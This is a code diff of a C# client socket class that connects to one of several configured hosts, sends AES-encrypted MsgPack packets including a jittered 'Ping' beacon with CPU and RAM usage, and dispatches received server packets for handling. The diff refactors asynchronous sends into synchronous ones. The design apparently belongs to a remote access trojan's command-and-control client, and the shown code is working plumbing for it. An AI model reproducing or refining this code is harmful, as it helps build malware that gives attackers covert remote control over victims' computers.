@@ -22,12 +22,10 @@ namespace Client.Sockets
         public static Socket Client { get; set; }
         private static byte[] Buffer { get; set; }
         private static long Buffersize { get; set; }
-        private static bool BufferRecevied { get; set; }
         private static Timer Tick { get; set; }
         private static MemoryStream MS { get; set; }
         public static bool IsConnected { get; set; }
         private static object SendSync { get; } = new object();
-        private static object EndSendSync { get; } = new object();
         private static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
         private static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");
 
@@ -39,17 +37,14 @@ namespace Client.Sockets
                 {
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
-                    ReceiveTimeout = -1,
-                    SendTimeout = -1,
                 };
                 Client.Connect(Convert.ToString(Settings.Host.Split(',')[new Random().Next(Settings.Host.Split(',').Length)]),
                     Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
                 Debug.WriteLine("Connected!");
                 IsConnected = true;
                 Buffer = new byte[4];
-                BufferRecevied = false;
                 MS = new MemoryStream();
-                BeginSend(SendInfo());
+                Send(SendInfo());
                 Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                 Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
@@ -102,34 +97,34 @@ namespace Client.Sockets
                 }
 
                 int recevied = Client.EndReceive(ar);
-                if (recevied > 0)
+                if (recevied == 4)
                 {
-                    if (!BufferRecevied)
+                    MS.Write(Buffer, 0, recevied);
+                    Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
+                    Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
+                    MS.Dispose();
+                    MS = new MemoryStream();
+                    if (Buffersize > 0)
                     {
-                        MS.Write(Buffer, 0, recevied);
-                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
-                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
-                        MS.Dispose();
-                        MS = new MemoryStream();
-                        if (Buffersize > 0)
+                        Buffer = new byte[Buffersize];
+                        while (MS.Length != Buffersize)
                         {
-                            Buffer = new byte[Buffersize];
-                            BufferRecevied = true;
+                            int rc = Client.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
+                            if (rc == 0)
+                            {
+                                IsConnected = false;
+                                return;
+                            }
+                            MS.Write(Buffer, 0, rc);
+                            Buffer = new byte[Buffersize - MS.Length];
                         }
-                    }
-                    else
-                    {
-                        MS.Write(Buffer, 0, recevied);
                         if (MS.Length == Buffersize)
                         {
                             ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
                             Buffer = new byte[4];
                             MS.Dispose();
                             MS = new MemoryStream();
-                            BufferRecevied = false;
                         }
-                        else
-                            Buffer = new byte[Buffersize - MS.Length];
                     }
                     Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                 }
@@ -146,13 +141,13 @@ namespace Client.Sockets
             }
         }
 
-        public static void BeginSend(byte[] msg)
+        public static void Send(byte[] msg)
         {
             lock (SendSync)
             {
                 try
                 {
-                    if (!Client.Connected || !IsConnected)
+                    if (!Client.Connected || !IsConnected || msg == null)
                     {
                         IsConnected = false;
                         return;
@@ -162,32 +157,8 @@ namespace Client.Sockets
                     byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
                     Client.Poll(-1, SelectMode.SelectWrite);
-                    Client.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
-                    Client.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
-                }
-                catch
-                {
-                    IsConnected = false;
-                    return;
-                }
-            }
-        }
-
-        public static void EndSend(IAsyncResult ar)
-        {
-            lock (EndSendSync)
-            {
-                try
-                {
-                    if (!Client.Connected || !IsConnected)
-                    {
-                        IsConnected = false;
-                        return;
-                    }
-
-                    int sent = 0;
-                    sent = Client.EndSend(ar);
-                    Debug.WriteLine("/// Client Sent " + sent.ToString() + " Bytes  ///");
+                    Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
+                    Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                 }
                 catch
                 {
@@ -199,30 +170,11 @@ namespace Client.Sockets
 
         public static void CheckServer(object obj)
         {
-            lock (SendSync)
-            {
-                lock (EndSendSync)
-                {
-                    try
-                    {
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Packet").AsString = "Ping";
-                        msgpack.ForcePathObject("Message").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
-
-                        byte[] buffer = Settings.aes256.Encrypt(msgpack.Encode2Bytes());
-                        byte[] buffersize = BitConverter.GetBytes(buffer.Length);
-
-                        Client.Poll(-1, SelectMode.SelectWrite);
-                        Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
-                        Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
-                    }
-                    catch
-                    {
-                        IsConnected = false;
-                        return;
-                    }
-                }
-            }
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Ping";
+            msgpack.ForcePathObject("Message").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
+            Send(msgpack.Encode2Bytes());
         }
+
     }
 }
